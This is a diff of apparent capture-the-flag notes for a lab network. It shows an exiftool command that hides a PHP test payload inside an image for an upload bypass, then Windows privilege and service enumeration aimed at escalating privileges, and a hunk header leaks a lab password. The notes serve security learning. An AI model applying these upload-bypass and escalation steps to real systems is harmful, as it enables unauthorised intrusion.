@@ -297,17 +297,16 @@ psw:i<3ruby
 
 exiftool -Comment="<?php echo \"<pre>Test Payload</pre>\"; die(); ?>" test-USERNAME.jpeg.php
 
-## 
-run
+### load
 /resources/uploads/test-USERNAME.jpeg.php
 vhups
 
 <h2>Task 42  AV Evasion Enumeration </h2>
 
-# C:\xampp\htdocs\resources\uploads>whoami
+### C:\xampp\htdocs\resources\uploads>whoami
 wreath-pc\thomas
 
-# C:\xampp\htdocs\resources\uploads>whoami /priv
+### C:\xampp\htdocs\resources\uploads>whoami /priv
 PRIVILEGES INFORMATION
 ----------------------
 
@@ -318,7 +317,7 @@ SeImpersonatePrivilege        Impersonate a client after authentication Enabled
 SeCreateGlobalPrivilege       Create global objects                     Enabled 
 SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
 
-# C:\xampp\htdocs\resources\uploads>whoami /groups
+### C:\xampp\htdocs\resources\uploads>whoami /groups
 GROUP INFORMATION
 -----------------
 
@@ -335,7 +334,7 @@ LOCAL                                Well-known group S-1-2-0      Mandatory gro
 NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
 Mandatory Label\High Mandatory Level Label            S-1-16-12288                                                   
 
-# C:\xampp\htdocs\resources\uploads>wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows"
+### C:\xampp\htdocs\resources\uploads>wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows"
 DisplayName                                                                         Name                                      PathName                                                                                    StartMode  
 Amazon SSM Agent                                                                    AmazonSSMAgent                            "C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe"                                          Auto       
 Apache2.4                                                                           Apache2.4                                 "C:\xampp\apache\bin\httpd.exe" -k runservice                                               Auto       
@@ -350,7 +349,7 @@ Windows Defender Antivirus Service                                              
 Windows Media Player Network Sharing Service                                        WMPNetworkSvc                             "C:\Program Files\Windows Media Player\wmpnetwk.exe"                                        Manual     
 
 
-# C:\xampp\htdocs\resources\uploads>sc qc SystemExplorerHelpService
+### C:\xampp\htdocs\resources\uploads>sc qc SystemExplorerHelpService
 sc qc SystemExplorerHelpService
 [SC] QueryServiceConfig SUCCESS
 
@@ -366,8 +365,6 @@ SERVICE_NAME: SystemExplorerHelpService
         SERVICE_START_NAME : LocalSystem
 
 ### C:\xampp\htdocs\resources\uploads>powershell "get-acl -Path 'C:\Program Files (x86)\System Explorer' | format-list"
-powershell "get-acl -Path 'C:\Program Files (x86)\System Explorer' | format-list"
-
 
 Path   : Microsoft.PowerShell.Core\FileSystem::C:\Program Files (x86)\System Explorer
 Owner  : BUILTIN\Administrators
